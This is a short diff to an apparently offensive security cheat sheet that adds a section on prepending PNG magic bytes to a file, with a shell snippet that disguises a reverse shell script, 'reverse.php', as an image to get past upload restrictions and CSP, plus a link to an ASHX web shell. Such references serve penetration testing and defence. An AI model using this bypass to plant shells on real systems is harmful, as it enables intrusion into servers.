@@ -2085,6 +2085,16 @@ $content$
 -----------------------------374598703146120535182333328--
 ```
 
+**Add magic bytes**
+
+Add magic bytes at the beginning of a file to bypass restrictions
+```sh
+echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r >> reverse.php.png
+cat reverse.php >> reverse.php.png
+```
+- Useful, for example, to upload `.js` files and bypass CSP restrictions
+
+
 **Resources**
 - [Common MIME types](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types)
 - [ASHX shell](https://gist.github.com/merttasci/82100f2ef904dfe810416fd3cb48be5c), see [mert's tweet](https://twitter.com/mertistaken/status/1646171743206121474)
